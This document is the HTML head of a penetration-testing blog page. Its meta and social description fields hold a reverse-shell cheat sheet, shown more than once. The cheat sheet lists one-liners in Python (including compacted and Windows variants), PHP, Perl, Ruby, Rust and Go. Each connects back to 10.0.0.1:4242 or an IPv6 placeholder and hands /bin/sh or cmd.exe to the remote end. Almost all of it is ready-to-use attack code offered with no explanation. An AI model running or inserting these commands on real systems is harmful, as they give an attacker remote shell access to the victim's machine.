<!DOCTYPE html>
<html lang="en">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Python (Linux only) | Gajendra Mahato</title>
<meta name="keywords" content="reverse-shell, post-exploitation, red-teaming, ethical-hacking-community, python-scripting, powershell-reverse-shell, code-snippets, cross-platform, shell-scripting">
<meta name="description" content="Reverse Shell
IPv4
export RHOST=&#34;10.0.0.1&#34;;export RPORT=4242;python -c &#39;import socket,os,pty;s=socket.socket();s.connect((os.getenv(&#34;RHOST&#34;),int(os.getenv(&#34;RPORT&#34;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&#34;/bin/sh&#34;)&#39;
python -c &#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&#34;/bin/sh&#34;)&#39;
python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;])&#39;
python -c &#39;import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,4242));subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())&#39;
IPv4 (No Spaces)
python -c &#39;socket=__import__(&#34;socket&#34;);os=__import__(&#34;os&#34;);pty=__import__(&#34;pty&#34;);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&#34;/bin/sh&#34;)&#39;
python -c &#39;socket=__import__(&#34;socket&#34;);subprocess=__import__(&#34;subprocess&#34;);os=__import__(&#34;os&#34;);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;])&#39;
python -c &#39;socket=__import__(&#34;socket&#34;);subprocess=__import__(&#34;subprocess&#34;);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,4242));subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())&#39;
IPv4 (No Spaces, Shortened)
python -c &#39;a=__import__;s=a(&#34;socket&#34;);o=a(&#34;os&#34;).dup2;p=a(&#34;pty&#34;).spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect((&#34;10.0.0.1&#34;,4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(&#34;/bin/sh&#34;)&#39;
python -c &#39;a=__import__;b=a(&#34;socket&#34;);p=a(&#34;subprocess&#34;).call;o=a(&#34;os&#34;).dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([&#34;/bin/sh&#34;,&#34;-i&#34;])&#39;
python -c &#39;a=__import__;b=a(&#34;socket&#34;);c=a(&#34;subprocess&#34;).call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,4242));f=s.fileno;c([&#34;/bin/sh&#34;,&#34;-i&#34;],stdin=f(),stdout=f(),stderr=f())&#39;
IPv4 (No Spaces, Shortened Further)
python -c &#39;a=__import__;s=a(&#34;socket&#34;).socket;o=a(&#34;os&#34;).dup2;p=a(&#34;pty&#34;).spawn;c=s();c.connect((&#34;10.0.0.1&#34;,4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(&#34;/bin/sh&#34;)&#39;
python -c &#39;a=__import__;b=a(&#34;socket&#34;).socket;p=a(&#34;subprocess&#34;).call;o=a(&#34;os&#34;).dup2;s=b();s.connect((&#34;10.0.0.1&#34;,4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([&#34;/bin/sh&#34;,&#34;-i&#34;])&#39;
python -c &#39;a=__import__;b=a(&#34;socket&#34;).socket;c=a(&#34;subprocess&#34;).call;s=b();s.connect((&#34;10.0.0.1&#34;,4242));f=s.fileno;c([&#34;/bin/sh&#34;,&#34;-i&#34;],stdin=f(),stdout=f(),stderr=f())&#39;
IPv6
python -c &#39;import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((&#34;dead:beef:2::125c&#34;,4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&#34;/bin/sh&#34;)&#39;
IPv6 (No Spaces)
python -c &#39;socket=__import__(&#34;socket&#34;);os=__import__(&#34;os&#34;);pty=__import__(&#34;pty&#34;);s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((&#34;dead:beef:2::125c&#34;,4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&#34;/bin/sh&#34;)&#39;
IPv6 (No Spaces, Shortened)
python -c &#39;a=__import__;c=a(&#34;socket&#34;);o=a(&#34;os&#34;).dup2;p=a(&#34;pty&#34;).spawn;s=c.socket(c.AF_INET6,c.SOCK_STREAM);s.connect((&#34;dead:beef:2::125c&#34;,4242,0,2));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(&#34;/bin/sh&#34;)&#39;
Windows only (Python2)
python.exe -c &#34;(lambda __y, __g, __contextlib: [[[[[[[(s.connect((&#39;10.0.0.1&#39;, 4242)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type(&#39;except&#39;, (), {&#39;__enter__&#39;: lambda self: None, &#39;__exit__&#39;: lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type(&#39;try&#39;, (), {&#39;__enter__&#39;: lambda self: None, &#39;__exit__&#39;: lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g[&#39;p2s_thread&#39;] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g[&#39;s2p_thread&#39;] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g[&#39;p&#39;] in [(subprocess.Popen([&#39;\\windows\\system32\\cmd.exe&#39;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g[&#39;s&#39;] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g[&#39;p2s&#39;], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l[&#39;s&#39;].send(__l[&#39;p&#39;].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l[&#39;s&#39;], __l[&#39;p&#39;] in [(s, p)]][0])({}), &#39;p2s&#39;)]][0] for __g[&#39;s2p&#39;], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l[&#39;p&#39;].stdin.write(__l[&#39;data&#39;]), __after())[1] if (len(__l[&#39;data&#39;]) &gt; 0) else __after())(lambda: __this()) for __l[&#39;data&#39;] in [(__l[&#39;s&#39;].recv(1024))]][0] if True else __after())())(lambda: None) for __l[&#39;s&#39;], __l[&#39;p&#39;] in [(s, p)]][0])({}), &#39;s2p&#39;)]][0] for __g[&#39;os&#39;] in [(__import__(&#39;os&#39;, __g, __g))]][0] for __g[&#39;socket&#39;] in [(__import__(&#39;socket&#39;, __g, __g))]][0] for __g[&#39;subprocess&#39;] in [(__import__(&#39;subprocess&#39;, __g, __g))]][0] for __g[&#39;threading&#39;] in [(__import__(&#39;threading&#39;, __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__(&#39;contextlib&#39;))&#34;
Windows only (Python3)
python.exe -c &#34;import socket,os,threading,subprocess as sp;p=sp.Popen([&#39;cmd.exe&#39;],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect((&#39;10.0.0.1&#39;,4242));threading.Thread(target=exec,args=(\&#34;while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)\&#34;,globals()),daemon=True).start();threading.Thread(target=exec,args=(\&#34;while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)\&#34;,globals())).start()&#34;
PHP
php -r &#39;$sock=fsockopen(&#34;10.0.0.1&#34;,4242);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;
php -r &#39;$sock=fsockopen(&#34;10.0.0.1&#34;,4242);shell_exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;
php -r &#39;$sock=fsockopen(&#34;10.0.0.1&#34;,4242);`/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3`;&#39;
php -r &#39;$sock=fsockopen(&#34;10.0.0.1&#34;,4242);system(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;
php -r &#39;$sock=fsockopen(&#34;10.0.0.1&#34;,4242);passthru(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;
php -r &#39;$sock=fsockopen(&#34;10.0.0.1&#34;,4242);popen(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;, &#34;r&#34;);&#39;
php -r &#39;$sock=fsockopen(&#34;10.0.0.1&#34;,4242);$proc=proc_open(&#34;/bin/sh -i&#34;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);&#39;
Perl
perl -e &#39;use Socket;$i=&#34;10.0.0.1&#34;;$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39;

perl -MIO -e &#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&#34;10.0.0.1:4242&#34;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;


NOTE: Windows only
perl -MIO -e &#39;$c=new IO::Socket::INET(PeerAddr,&#34;10.0.0.1:4242&#34;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;
Ruby
ruby -rsocket -e&#39;f=TCPSocket.open(&#34;10.0.0.1&#34;,4242).to_i;exec sprintf(&#34;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&#34;,f,f,f)&#39;

ruby -rsocket -e&#39;exit if fork;c=TCPSocket.new(&#34;10.0.0.1&#34;,&#34;4242&#34;);loop{c.gets.chomp!;(exit! if $_==&#34;exit&#34;);($_=~/cd (.&#43;)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts &#34;failed: #{$_}&#34;}&#39;

NOTE: Windows only
ruby -rsocket -e &#39;c=TCPSocket.new(&#34;10.0.0.1&#34;,&#34;4242&#34;);while(cmd=c.gets);IO.popen(cmd,&#34;r&#34;){|io|c.print io.read}end&#39;
Rust
use std::net::TcpStream;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};

fn main() {
    let s = TcpStream::connect(&#34;10.0.0.1:4242&#34;).unwrap();
    let fd = s.as_raw_fd();
    Command::new(&#34;/bin/sh&#34;)
        .arg(&#34;-i&#34;)
        .stdin(unsafe { Stdio::from_raw_fd(fd) })
        .stdout(unsafe { Stdio::from_raw_fd(fd) })
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn()
        .unwrap()
        .wait()
        .unwrap();
}
Golang
echo &#39;package main;import&#34;os/exec&#34;;import&#34;net&#34;;func main(){c,_:=net.Dial(&#34;tcp&#34;,&#34;10.0.0.1:4242&#34;);cmd:=exec.Command(&#34;/bin/sh&#34;);cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}&#39; &gt; /tmp/t.go &amp;&amp; go run /tmp/t.go &amp;&amp; rm /tmp/t.go
Resources: https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet">
<meta name="author" content="">
<link rel="canonical" href="http://localhost:1313/posts/penetration-testing/webvulnerability/python_revshell/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.343cc480b9ffc8f04ccbe5e968ad674880cab773ec19905e93033065c1e7a804.css" integrity="sha256-NDzEgLn/yPBMy&#43;XpaK1nSIDKt3PsGZBekwMwZcHnqAQ=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.jpg">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon.jpg">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon.jpg">
<link rel="apple-touch-icon" href="http://localhost:1313/favicon.jpg">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/penetration-testing/webvulnerability/python_revshell/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript>
<script>
    if (localStorage.getItem("pref-theme") === "light") {
        document.querySelector("html").dataset.theme = 'light';
    }

</script><link rel="stylesheet" href="/css/custom.min.63fa54a2907ef17de5b711b6a3bfab36f6c57ca719c46ce6516cfd0d8ee7b452.css" />
<link
    rel="stylesheet"
    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"
/>
<link rel="preconnect" href="https://fonts.googleapis.com" />
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
<link
    href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&family=Rajdhani:wght@300;400;500;600;700&display=swap"
    rel="stylesheet"
/>
<link
    rel="alternate"
    type="application/rss+xml"
    title="Gajendra Mahato"
    href="http://localhost:1313/index.xml"
/>
<meta property="og:url" content="http://localhost:1313/posts/penetration-testing/webvulnerability/python_revshell/">
  <meta property="og:site_name" content="Gajendra Mahato">
  <meta property="og:title" content="Python (Linux only)">
  <meta property="og:description" content="Reverse Shell IPv4 export RHOST=&#34;10.0.0.1&#34;;export RPORT=4242;python -c &#39;import socket,os,pty;s=socket.socket();s.connect((os.getenv(&#34;RHOST&#34;),int(os.getenv(&#34;RPORT&#34;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&#34;/bin/sh&#34;)&#39; python -c &#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&#34;/bin/sh&#34;)&#39; python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;])&#39; python -c &#39;import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,4242));subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())&#39; IPv4 (No Spaces) python -c &#39;socket=__import__(&#34;socket&#34;);os=__import__(&#34;os&#34;);pty=__import__(&#34;pty&#34;);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&#34;/bin/sh&#34;)&#39; python -c &#39;socket=__import__(&#34;socket&#34;);subprocess=__import__(&#34;subprocess&#34;);os=__import__(&#34;os&#34;);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;])&#39; python -c &#39;socket=__import__(&#34;socket&#34;);subprocess=__import__(&#34;subprocess&#34;);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,4242));subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())&#39; IPv4 (No Spaces, Shortened) python -c &#39;a=__import__;s=a(&#34;socket&#34;);o=a(&#34;os&#34;).dup2;p=a(&#34;pty&#34;).spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect((&#34;10.0.0.1&#34;,4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(&#34;/bin/sh&#34;)&#39; python -c &#39;a=__import__;b=a(&#34;socket&#34;);p=a(&#34;subprocess&#34;).call;o=a(&#34;os&#34;).dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([&#34;/bin/sh&#34;,&#34;-i&#34;])&#39; python -c &#39;a=__import__;b=a(&#34;socket&#34;);c=a(&#34;subprocess&#34;).call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,4242));f=s.fileno;c([&#34;/bin/sh&#34;,&#34;-i&#34;],stdin=f(),stdout=f(),stderr=f())&#39; IPv4 (No Spaces, Shortened Further) python -c &#39;a=__import__;s=a(&#34;socket&#34;).socket;o=a(&#34;os&#34;).dup2;p=a(&#34;pty&#34;).spawn;c=s();c.connect((&#34;10.0.0.1&#34;,4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(&#34;/bin/sh&#34;)&#39; python -c &#39;a=__import__;b=a(&#34;socket&#34;).socket;p=a(&#34;subprocess&#34;).call;o=a(&#34;os&#34;).dup2;s=b();s.connect((&#34;10.0.0.1&#34;,4242));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([&#34;/bin/sh&#34;,&#34;-i&#34;])&#39; python -c &#39;a=__import__;b=a(&#34;socket&#34;).socket;c=a(&#34;subprocess&#34;).call;s=b();s.connect((&#34;10.0.0.1&#34;,4242));f=s.fileno;c([&#34;/bin/sh&#34;,&#34;-i&#34;],stdin=f(),stdout=f(),stderr=f())&#39; IPv6 python -c &#39;import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((&#34;dead:beef:2::125c&#34;,4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&#34;/bin/sh&#34;)&#39; IPv6 (No Spaces) python -c &#39;socket=__import__(&#34;socket&#34;);os=__import__(&#34;os&#34;);pty=__import__(&#34;pty&#34;);s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((&#34;dead:beef:2::125c&#34;,4242,0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&#34;/bin/sh&#34;)&#39; IPv6 (No Spaces, Shortened) python -c &#39;a=__import__;c=a(&#34;socket&#34;);o=a(&#34;os&#34;).dup2;p=a(&#34;pty&#34;).spawn;s=c.socket(c.AF_INET6,c.SOCK_STREAM);s.connect((&#34;dead:beef:2::125c&#34;,4242,0,2));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(&#34;/bin/sh&#34;)&#39; Windows only (Python2) python.exe -c &#34;(lambda __y, __g, __contextlib: [[[[[[[(s.connect((&#39;10.0.0.1&#39;, 4242)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type(&#39;except&#39;, (), {&#39;__enter__&#39;: lambda self: None, &#39;__exit__&#39;: lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type(&#39;try&#39;, (), {&#39;__enter__&#39;: lambda self: None, &#39;__exit__&#39;: lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g[&#39;p2s_thread&#39;] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g[&#39;s2p_thread&#39;] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g[&#39;p&#39;] in [(subprocess.Popen([&#39;\\windows\\system32\\cmd.exe&#39;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g[&#39;s&#39;] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g[&#39;p2s&#39;], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l[&#39;s&#39;].send(__l[&#39;p&#39;].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l[&#39;s&#39;], __l[&#39;p&#39;] in [(s, p)]][0])({}), &#39;p2s&#39;)]][0] for __g[&#39;s2p&#39;], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l[&#39;p&#39;].stdin.write(__l[&#39;data&#39;]), __after())[1] if (len(__l[&#39;data&#39;]) &gt; 0) else __after())(lambda: __this()) for __l[&#39;data&#39;] in [(__l[&#39;s&#39;].recv(1024))]][0] if True else __after())())(lambda: None) for __l[&#39;s&#39;], __l[&#39;p&#39;] in [(s, p)]][0])({}), &#39;s2p&#39;)]][0] for __g[&#39;os&#39;] in [(__import__(&#39;os&#39;, __g, __g))]][0] for __g[&#39;socket&#39;] in [(__import__(&#39;socket&#39;, __g, __g))]][0] for __g[&#39;subprocess&#39;] in [(__import__(&#39;subprocess&#39;, __g, __g))]][0] for __g[&#39;threading&#39;] in [(__import__(&#39;threading&#39;, __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__(&#39;contextlib&#39;))&#34; Windows only (Python3) python.exe -c &#34;import socket,os,threading,subprocess as sp;p=sp.Popen([&#39;cmd.exe&#39;],stdin=sp.PIPE,stdout=sp.PIPE,stderr=sp.STDOUT);s=socket.socket();s.connect((&#39;10.0.0.1&#39;,4242));threading.Thread(target=exec,args=(\&#34;while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)\&#34;,globals()),daemon=True).start();threading.Thread(target=exec,args=(\&#34;while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)\&#34;,globals())).start()&#34; PHP php -r &#39;$sock=fsockopen(&#34;10.0.0.1&#34;,4242);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39; php -r &#39;$sock=fsockopen(&#34;10.0.0.1&#34;,4242);shell_exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39; php -r &#39;$sock=fsockopen(&#34;10.0.0.1&#34;,4242);`/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3`;&#39; php -r &#39;$sock=fsockopen(&#34;10.0.0.1&#34;,4242);system(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39; php -r &#39;$sock=fsockopen(&#34;10.0.0.1&#34;,4242);passthru(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39; php -r &#39;$sock=fsockopen(&#34;10.0.0.1&#34;,4242);popen(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;, &#34;r&#34;);&#39; php -r &#39;$sock=fsockopen(&#34;10.0.0.1&#34;,4242);$proc=proc_open(&#34;/bin/sh -i&#34;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);&#39; Perl perl -e &#39;use Socket;$i=&#34;10.0.0.1&#34;;$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39; perl -MIO -e &#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&#34;10.0.0.1:4242&#34;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39; NOTE: Windows only perl -MIO -e &#39;$c=new IO::Socket::INET(PeerAddr,&#34;10.0.0.1:4242&#34;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39; Ruby ruby -rsocket -e&#39;f=TCPSocket.open(&#34;10.0.0.1&#34;,4242).to_i;exec sprintf(&#34;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&#34;,f,f,f)&#39; ruby -rsocket -e&#39;exit if fork;c=TCPSocket.new(&#34;10.0.0.1&#34;,&#34;4242&#34;);loop{c.gets.chomp!;(exit! if $_==&#34;exit&#34;);($_=~/cd (.&#43;)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts &#34;failed: #{$_}&#34;}&#39; NOTE: Windows only ruby -rsocket -e &#39;c=TCPSocket.new(&#34;10.0.0.1&#34;,&#34;4242&#34;);while(cmd=c.gets);IO.popen(cmd,&#34;r&#34;){|io|c.print io.read}end&#39; Rust use std::net::TcpStream; use std::os::unix::io::{AsRawFd, FromRawFd}; use std::process::{Command, Stdio}; fn main() { let s = TcpStream::connect(&#34;10.0.0.1:4242&#34;).unwrap(); let fd = s.as_raw_fd(); Command::new(&#34;/bin/sh&#34;) .arg(&#34;-i&#34;) .stdin(unsafe { Stdio::from_raw_fd(fd) }) .stdout(unsafe { Stdio::from_raw_fd(fd) }) .stderr(unsafe { Stdio::from_raw_fd(fd) }) .spawn() .unwrap() .wait() .unwrap(); } Golang echo &#39;package main;import&#34;os/exec&#34;;import&#34;net&#34;;func main(){c,_:=net.Dial(&#34;tcp&#34;,&#34;10.0.0.1:4242&#34;);cmd:=exec.Command(&#34;/bin/sh&#34;);cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}&#39; &gt; /tmp/t.go &amp;&amp; go run /tmp/t.go &amp;&amp; rm /tmp/t.go Resources: https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2026-01-13T00:00:00+00:00">
    <meta property="article:modified_time" content="2026-01-13T00:00:00+00:00">
    <meta property="article:tag" content="Reverse-Shell">
    <meta property="article:tag" content="Post-Exploitation">
    <meta property="article:tag" content="Red-Teaming">
    <meta property="article:tag" content="Ethical-Hacking-Community">
    <meta property="article:tag" content="Python-Scripting">
    <meta property="article:tag" content="Powershell-Reverse-Shell">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Python (Linux only)">
<meta name="twitter:description" content="Reverse Shell
IPv4
export RHOST=&#34;10.0.0.1&#34;;export RPORT=4242;python -c &#39;import socket,os,pty;s=socket.socket();s.connect((os.getenv(&#34;RHOST&#34;),int(os.getenv(&#34;RPORT&#34;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&#34;/bin/sh&#34;)&#39;
python -c &#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&#34;/bin/sh&#34;)&#39;
python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;])&#39;
python -c &#39;import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.0.0.1&#34;,4242));subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())&#39;
IPv4 (No Spaces)
